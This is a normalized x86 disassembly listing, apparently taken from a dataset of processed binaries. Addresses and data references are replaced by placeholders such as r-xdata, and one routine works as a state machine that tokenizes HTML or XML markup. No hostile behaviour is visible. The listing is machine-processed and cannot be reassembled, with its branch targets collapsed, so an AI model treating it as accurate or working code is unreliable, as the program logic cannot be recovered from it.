push [ esp + 0x24 ]
xor bl bl
call sub_41ed6b
mov [ esp + 0x1c ] eax
xor ebx ebx
jmp r-xdata
test bl 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x248 ]
and ebx 0xfffffff7
call sub_40415f
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] 0x20000
je r-xdata
and [ esp + 0x10 ] 0xfffbffff
push ebx
push 0x1
lea ecx [ esp + 0x14c ]
call sub_40415f
test [ esp + 0x10 ] 0x40000
je r-xdata
test bl 0x2
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0xc0 ]
and ebx 0xfffffffb
call sub_40415f
push r--data
lea ecx [ esp + 0x1b8 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x1e
mov ecx [ esp + 0x1c ]
mov eax [ ecx ]
push rw-data
lea edx [ esp + 0x1b8 ]
push edx
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x468 ] 0x10
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x460 ] 0x1f
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xfffdffff
push ebx
push 0x1
lea ecx [ esp + 0x184 ]
call sub_40415f
or [ esp + 0x460 ] 0xffffffff
test bl 0x1
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x328 ]
and ebx 0xfffffffd
call sub_40415f
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] 0x80000
je r-xdata
push r--data
lea ecx [ esp + 0x1f0 ]
call sub_403dc1
mov eax [ esp + 0x18 ]
mov [ esp + 0x460 ] 0x20
mov eax [ eax + 0x4 ]
or [ esp + 0x10 ] 0x80000
call sub_4049ca
mov edi [ esp + 0x1c ]
add eax 0x1c
push eax
lea eax [ esp + 0x1f0 ]
push eax
push [ esp + 0x30 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
cmp [ esp + 0x17 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0xf8 ]
and ebx 0xfffffffe
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x460 ] 0x22
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xfff7ffff
push ebx
push 0x1
lea ecx [ esp + 0x1f4 ]
call sub_40415f
push esi
lea ecx [ esp + 0x2b4 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x6
or ebx 0x20
push esi
lea ecx [ esp + 0x164 ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
mov [ esp + 0x460 ] 0x7
or ebx 0x40
push r--data
lea ecx [ esp + 0x35c ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
lea ecx [ esp + 0x2b0 ]
push ecx
lea ecx [ esp + 0x164 ]
push ecx
lea ecx [ esp + 0x360 ]
mov [ esp + 0x468 ] 0x8
mov eax [ edi ]
push ecx
or ebx 0x80
mov ecx edi
mov [ esp + 0x1c ] ebx
call [ eax + 0x50 ]
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3ac ] 0x8
jmp r-xdata
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] 0x100000
je r-xdata
push r--data
lea ecx [ esp + 0x228 ]
call sub_403dc1
mov eax [ esp + 0x18 ]
mov [ esp + 0x460 ] 0x23
mov eax [ eax + 0x4 ]
or [ esp + 0x10 ] 0x100000
call sub_4049ca
mov edi [ esp + 0x1c ]
push eax
lea eax [ esp + 0x228 ]
push eax
push [ esp + 0x30 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
mov [ esp + 0x17 ] 0x1
push r--data
lea ecx [ esp + 0x12c ]
call sub_403dc1
mov [ esp + 0x460 ] 0x9
or ebx 0x100
push r--data
lea ecx [ esp + 0x27c ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
lea ecx [ esp + 0x128 ]
push ecx
lea ecx [ esp + 0x27c ]
mov [ esp + 0x464 ] 0xa
mov eax [ edi ]
push ecx
or ebx 0x200
mov ecx edi
mov [ esp + 0x18 ] ebx
call [ eax + 0x44 ]
mov [ esp + 0x17 ] 0x0
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x260 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x25
mov ecx [ esp + 0x20 ]
mov eax [ ecx ]
lea edx [ esp + 0x25c ]
push edx
call [ eax + 0x4c ]
push ebx
push 0x1
lea ecx [ esp + 0x264 ]
mov edi eax
mov [ esp + 0x468 ] 0x10
call sub_40415f
push esi
lea ecx [ esp + 0x308 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x26
or [ esp + 0x10 ] 0x200000
push esi
lea ecx [ esp + 0x2d0 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x27
or [ esp + 0x10 ] __dos_header
push r--data
lea ecx [ esp + 0x298 ]
call sub_403dc1
lea ecx [ esp + 0x304 ]
push ecx
lea ecx [ esp + 0x2d0 ]
push ecx
lea ecx [ esp + 0x29c ]
mov [ esp + 0x468 ] 0x28
mov eax [ edi ]
push ecx
mov esi 0x800000
or [ esp + 0x1c ] esi
mov ecx edi
call [ eax + 0x50 ]
mov edi [ esp + 0x18 ]
test al al
je r-xdata
and [ esp + 0x10 ] 0xffefffff
push ebx
push 0x1
lea ecx [ esp + 0x22c ]
call sub_40415f
test ebx 0x100
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x280 ]
and ebx 0xfffffdff
call sub_40415f
test ebx 0x200
je r-xdata
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x17 ] 0x1
cmp [ edi + 0x1c ] ebx
jne r-xdata
test bl bl
jns r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x130 ]
and ebx 0xfffffeff
call sub_40415f
test [ esp + 0x10 ] __dos_header
je r-xdata
and [ esp + 0x10 ] 0xff7fffff
push ebx
push 0x1
lea ecx [ esp + 0x29c ]
call sub_40415f
test [ esp + 0x10 ] esi
je r-xdata
test bl 0x40
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x360 ]
and ebx 0xffffff7f
call sub_40415f
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] 0x200000
je r-xdata
and [ esp + 0x10 ] 0xffbfffff
push ebx
push 0x1
lea ecx [ esp + 0x2d4 ]
call sub_40415f
or [ esp + 0x460 ] 0xffffffff
test bl 0x20
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x168 ]
and ebx 0xffffffbf
call sub_40415f
cmp [ esp + 0x17 ] 0x0
je r-xdata
and [ esp + 0x10 ] 0xffdfffff
push ebx
push 0x1
lea ecx [ esp + 0x30c ]
call sub_40415f
cmp [ esp + 0x17 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x2b8 ]
and ebx 0xffffffdf
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x460 ] 0x2f
mov esi 0x4000000
cmp eax ebx
je r-xdata
lea eax [ esp + 0x3e4 ]
mov [ esp + 0x3e4 ] r--data
call sub_41c363
lea ecx [ edi + 0x8 ]
mov [ esp + 0x460 ] 0x29
call sub_41c427
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx eax
lea eax [ esp + 0x3e4 ]
call sub_41c427
cmp [ esp + 0x448 ] 0x0
jne r-xdata
push esi
lea ecx [ esp + 0x20c ]
call sub_403dc1
mov [ esp + 0x460 ] 0xb
or ebx 0x400
push esi
lea ecx [ esp + 0x2ec ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
mov [ esp + 0x460 ] 0xc
or ebx 0x800
push r--data
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
lea ecx [ esp + 0x208 ]
push ecx
lea ecx [ esp + 0x2ec ]
push ecx
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x468 ] 0xd
mov eax [ edi ]
push ecx
or ebx 0x1000
mov ecx edi
mov [ esp + 0x1c ] ebx
call [ eax + 0x50 ]
mov esi 0x4000
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3ac ] 0x9
jmp r-xdata
mov [ esp + 0x460 ] 0x10
test [ esp + 0x10 ] esi
je r-xdata
push r--data
lea ecx [ esp + 0x394 ]
call sub_403dc1
mov eax [ esp + 0x18 ]
mov [ esp + 0x460 ] 0x30
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
or [ esp + 0x10 ] esi
call [ eax + 0xc ]
mov edi [ esp + 0x1c ]
push eax
lea eax [ esp + 0x394 ]
push eax
push [ esp + 0x28 ]
xor bl bl
call sub_41ed6b
mov edi [ esp + 0x18 ]
xor ebx ebx
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x460 ] 0x2a
mov esi 0x2000000
cmp eax ebx
je r-xdata
call sub_41c646
mov [ esp + 0x448 ] 0x1
mov [ esp + 0x17 ] 0x1
push r--data
lea ecx [ esp + 0x30 ]
call sub_403dc1
mov [ esp + 0x460 ] 0xe
or ebx 0x2000
push r--data
lea ecx [ esp + 0x19c ]
mov [ esp + 0x14 ] ebx
call sub_403dc1
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ esp + 0x19c ]
mov [ esp + 0x464 ] 0xf
mov eax [ edi ]
push ecx
or ebx esi
mov ecx edi
mov [ esp + 0x18 ] ebx
call [ eax + 0x44 ]
mov [ esp + 0x17 ] 0x0
test al al
je r-xdata
push 0x1
push [ edi + 0x4 ]
lea eax [ esp + 0x3d0 ]
mov esi edi
call sub_40d8fc
mov ecx [ edi + 0x4 ]
push [ esp + 0x24 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
push ebx
push 0x1
lea ecx [ esp + 0x3d0 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ esp + 0x398 ]
call sub_40415f
test [ esp + 0x10 ] esi
je r-xdata
push r--data
lea ecx [ esp + 0x340 ]
call sub_403dc1
mov [ esp + 0x460 ] 0x2b
or [ esp + 0x10 ] 0x1000000
lea ecx [ esp + 0x3ac ]
lea edi [ esp + 0x3e4 ]
call sub_41c398
push eax
lea eax [ esp + 0x340 ]
mov [ esp + 0x464 ] 0x2c
mov edi [ esp + 0x20 ]
or [ esp + 0x14 ] esi
push eax
push [ esp + 0x28 ]
xor bl bl
call sub_41ed6b
mov edi [ esp + 0x18 ]
xor ebx ebx
xor esi esi
xor esi esi
push esi
push 0x1
lea ecx [ esp + 0x1a0 ]
and ebx 0xffffbfff
call sub_40415f
jmp r-xdata
test esi ebx
je r-xdata
mov [ esp + 0x460 ] 0x29
test [ esp + 0x10 ] 0x1000000
je r-xdata
and [ esp + 0x10 ] 0xfdffffff
push ebx
push 0x1
lea ecx [ esp + 0x3b4 ]
call sub_40415f
test ebx 0x1000
je r-xdata
push esi
push 0x1
lea ecx [ esp + 0x34 ]
and ebx 0xffffdfff
call sub_40415f
test ebx 0x2000
je r-xdata
mov [ esp + 0x460 ] 0x10
jmp r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x344 ]
call sub_40415f
test ebx 0x800
je r-xdata
push esi
push 0x1
lea ecx [ esp + 0x1d8 ]
and ebx 0xffffefff
call sub_40415f
test ebx 0x400
je r-xdata
push esi
push 0x1
lea ecx [ esp + 0x2f0 ]
and ebx 0xfffff7ff
call sub_40415f
cmp [ esp + 0x17 ] 0x0
je r-xdata
push esi
push 0x1
lea ecx [ esp + 0x210 ]
call sub_40415f
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3ac ] 0xa
jmp r-xdata
sub_4180a2
push 0x5c
mov eax sub_43ae3d
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ edi + 0x4 ] 0x4
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_403dae
lea esi [ edi + 0x24 ]
call sub_403dae
lea esi [ edi + 0x40 ]
call sub_403dae
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x5c ] 0x0
mov [ edi + 0x5d ] 0x0
test ebx ebx
je r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
mov esi r--data
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x14 ] 0x1
je r-xdata
and [ ebp - 0x14 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push esi
lea ecx [ ebp - 0x4c ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x4
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push esi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ebx ]
or [ ebp - 0x14 ] 0x2
push ecx
mov ecx ebx
call [ eax + 0x44 ]
test al al
je r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov eax edi
call sub_425e4c
retn 0x4
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
test [ ebp - 0x14 ] 0x2
je r-xdata
mov esi r--data
push esi
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
lea ecx [ ebp - 0x68 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ edi + 0x5c ] 0x1
push esi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
mov esi r--data
push esi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0xb
call sub_403dc1
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0xc
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0xd ] al
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
mov [ edi + 0x5d ] 0x1
call sub_403dc1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x2c ]
push 0xffffffff
push 0x0
push eax
lea ecx [ edi + 0x24 ]
call sub_40400a
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
push esi
lea ecx [ ebp - 0x68 ]
call sub_403dc1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0xd
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x2c ]
push 0xffffffff
push 0x0
push eax
lea ecx [ edi + 0x40 ]
call sub_40400a
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
sub_41833a
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x40 ]
mov [ esi ] r--data
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x24 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
call sub_40415f
mov [ esi ] r--data
pop esi
retn
sub_41836f
push ebp
sub esp 0x60
push 0x54
mov eax sub_43bdd7
call sub_425dad
mov [ ebp + 0x54 ] ecx
xor ebx ebx
mov [ ebp + 0x60 ] ebx
cmp [ ecx + 0x5d ] bl
jne r-xdata
mov esi 0x80
push esi
cmp [ ecx + 0x5c ] bl
je r-xdata
xor eax eax
jmp r-xdata
call sub_4246c6
pop ecx
mov [ ebp + 0x5c ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
call sub_4246c6
pop ecx
mov [ ebp + 0x5c ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x64
leave
retn
xor edi edi
push r--data
lea ecx [ ebp - 0x44 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp + 0x60 ] 0x4
call sub_403dc1
push ebx
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x8
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0xc
call sub_41ec78
mov edi eax
jmp r-xdata
xor edi edi
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp ]
mov [ ebp + 0x60 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0x3
call sub_41ec78
mov edi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x4
je r-xdata
and [ ebp + 0x60 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
test [ ebp + 0x60 ] 0x8
mov [ ebp + 0x5c ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x1
je r-xdata
and [ ebp + 0x60 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
test [ ebp + 0x60 ] 0x2
mov [ ebp + 0x5c ] edi
je r-xdata
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push rw-data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xb
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
lea ecx [ ebp + 0x1c ]
and [ ebp + 0x60 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push rw-data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
lea ecx [ ebp + 0x38 ]
jmp r-xdata
and [ ebp + 0x60 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x10
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
mov eax [ ebp + 0x54 ]
add eax 0x24
push eax
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xd
mov edi [ ebp + 0x5c ]
or [ ebp + 0x60 ] 0x10
push eax
push [ ebp + 0x58 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
call sub_40415f
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x58 ] eax
mov [ ebp - 0x4 ] 0xc
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x54 ]
cmp [ edi + 0x54 ] ebx
je r-xdata
and [ ebp + 0x60 ] 0xffffffef
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ ebp + 0x5c ]
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x58 ] eax
mov [ ebp - 0x4 ] 0xf
cmp eax ebx
je r-xdata
test [ ebp + 0x60 ] 0x20
je r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
add edi 0x40
push edi
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x10
mov edi [ ebp + 0x5c ]
or [ ebp + 0x60 ] 0x20
push eax
push [ ebp + 0x58 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
call sub_40415f
sub_4185e8
push ebx
mov [ edi + 0x4 ] eax
push esi
xor ebx ebx
lea eax [ edi + 0x14 ]
push eax
mov [ edi ] r--data
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
call sub_418e5f
lea esi [ edi + 0x30 ]
call sub_403dae
lea esi [ edi + 0x4c ]
call sub_403dae
lea esi [ edi + 0x68 ]
call sub_403dae
lea esi [ edi + 0x84 ]
call sub_403dae
pop esi
mov [ edi + 0xa0 ] ebx
mov [ edi + 0xa4 ] bl
mov eax edi
pop ebx
retn
sub_418657
push 0x4
mov eax sub_43ad87
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x4
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x84 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x68 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x30 ]
call sub_40415f
lea eax [ esi + 0x14 ]
call sub_418e9c
call sub_425e4c
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4186c3
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0xc ]
sub esp 0x1c
cmp [ eax + 0x18 ] 0x10
push ebx
push esi
push edi
jb r-xdata
add eax 0x4
mov [ esp + 0x14 ] eax
add eax 0x4
mov [ esp + 0x14 ] eax
mov eax [ eax ]
jmp r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ esi + 0x14 ]
add ebx eax
lea edi [ esp + 0x20 ]
call sub_404708
cmp [ esp + 0x18 ] 0xfffffffc
je r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
mov ebx eax
lea edi [ esp + 0x18 ]
call sub_404708
mov edi [ esp + 0x1c ]
cmp edi [ esp + 0x24 ]
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov al 0x1
mov esi [ esp + 0x18 ]
cmp esi 0xfffffffc
je r-xdata
call sub_423d5c
cmp eax [ esp + 0x20 ]
je r-xdata
mov eax [ esp + 0x1c ]
mov bl [ eax ]
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
push 0xd
pop edx
mov [ esp + 0x10 ] bl
cmp eax edx
ja r-xdata
test esi esi
jne r-xdata
cmp esi 0xfffffffc
je r-xdata
jmp [ eax * 4 + jump_table_418b5f ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_423d5c
inc [ esp + 0x1c ]
jmp r-xdata
test esi esi
jne r-xdata
push r--data
lea ecx [ edi + 0x30 ]
call sub_40409c
cmp bl 0x9
je r-xdata
cmp bl 0x9
je r-xdata
cmp bl 0x9
je r-xdata
mov esi r--data
push esi
lea ecx [ edi + 0x30 ]
call sub_40409c
cmp bl 0x3c
je r-xdata
cmp bl 0x9
je r-xdata
cmp bl 0x9
je r-xdata
movzx eax bl
sub eax 0x2f
je r-xdata
cmp bl 0x9
je r-xdata
push 0x9
pop ecx
cmp bl cl
je r-xdata
cmp bl 0x9
je r-xdata
cmp bl 0x9
je r-xdata
cmp bl 0x22
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
mov eax [ esp + 0x14 ]
jb r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_423d5c
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov ecx [ edi + 0x8 ]
test ecx ecx
je r-xdata
push [ esp + 0x10 ]
xor ebx ebx
add edi 0x4c
inc ebx
call sub_403fc6
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov esi edi
call sub_418df5
xor al al
jmp r-xdata
sub eax edx
je r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov al 0x1
mov al bl
call sub_418e4c
jmp r-xdata
mov ecx edi
call sub_418ccf
mov [ edi + 0xa4 ] 0x0
cmp bl 0x27
je r-xdata
call sub_423d5c
mov ecx [ esi + 0x14 ]
add ecx eax
cmp edi ecx
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp bl 0x3c
jne r-xdata
test al al
jne r-xdata
movzx eax bl
sub eax 0x21
je r-xdata
test al al
jne r-xdata
mov [ edi + 0x10 ] 0x6
movzx eax bl
sub eax 0x21
je r-xdata
test al al
jne r-xdata
mov [ edi + 0x10 ] 0x1
mov eax [ ecx ]
lea ebx [ edi + 0x4c ]
push ebx
call [ eax + 0x20 ]
push esi
mov ecx ebx
call sub_40409c
mov esi [ esp + 0x18 ]
jmp r-xdata
cmp bl 0x3e
jne r-xdata
test al al
jne r-xdata
movzx eax bl
sub eax 0x2f
je r-xdata
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec eax
dec eax
je r-xdata
movzx eax bl
sub eax 0x2f
je r-xdata
test al al
jne r-xdata
movzx eax bl
sub eax 0x2f
je r-xdata
mov [ edi + 0x10 ] 0x8
jmp r-xdata
test al al
je r-xdata
cmp bl 0x3d
jne r-xdata
test al al
jne r-xdata
cmp bl 0x22
je r-xdata
test al al
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
je r-xdata
cmp bl 0x3c
je r-xdata
call sub_423d5c
mov ecx [ esi + 0x14 ]
add ecx eax
cmp [ esp + 0x1c ] ecx
jb r-xdata
mov [ edi + 0x10 ] 0x1
jmp r-xdata
sub eax 0xe
je r-xdata
sub eax 0xe
je r-xdata
mov ecx edi
call sub_418b97
sub eax edx
je r-xdata
mov eax edi
call sub_418d98
test al al
je r-xdata
jmp r-xdata
mov [ edi + 0x10 ] 0x2
jmp r-xdata
sub eax edx
je r-xdata
sub eax edx
je r-xdata
mov [ edi + 0x10 ] 0x9
jmp r-xdata
mov [ edi + 0xa4 ] 0x1
cmp bl 0x27
je r-xdata
push 0x27
jmp r-xdata
push [ esp + 0x10 ]
mov [ edi + 0x10 ] 0xb
jmp r-xdata
sub eax edx
je r-xdata
sub eax edx
je r-xdata
and [ edi + 0x10 ] 0x0
jmp r-xdata
dec eax
dec eax
je r-xdata
push [ esp + 0x10 ]
add edi 0x30
jmp r-xdata
push 0x2
pop ecx
sub eax ecx
je r-xdata
dec eax
je r-xdata
mov [ edi + 0x10 ] edx
jmp r-xdata
add edi 0x84
dec eax
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
push [ esp + 0x10 ]
xor ebx ebx
add edi 0x30
inc ebx
call sub_403fc6
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0xa
jmp r-xdata
xor ebx ebx
inc ebx
call sub_403fc6
jmp r-xdata
cmp [ edi + 0xa0 ] 0x1
je r-xdata
dec eax
je r-xdata
mov [ edi + 0x10 ] ecx
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
mov ecx edi
call sub_418b97
mov [ edi + 0x10 ] 0x4
jmp r-xdata
dec eax
je r-xdata
mov ecx edi
mov [ edi + 0x10 ] 0x4
call sub_418b97
jmp r-xdata
lea eax [ edi + 0xa0 ]
cmp [ eax ] 0x1
jne r-xdata
push [ esp + 0x10 ]
xor ebx ebx
add edi 0x68
inc ebx
call sub_403fc6
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x7
jmp r-xdata
push [ esp + 0x10 ]
add edi 0x68
jmp r-xdata
mov [ edi + 0x10 ] 0x5
mov [ edi + 0xa0 ] 0x1
jmp r-xdata
push [ esp + 0x10 ]
xor ebx ebx
add edi 0x30
inc ebx
call sub_403fc6
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x5
jmp r-xdata
mov [ eax ] ecx
jmp r-xdata
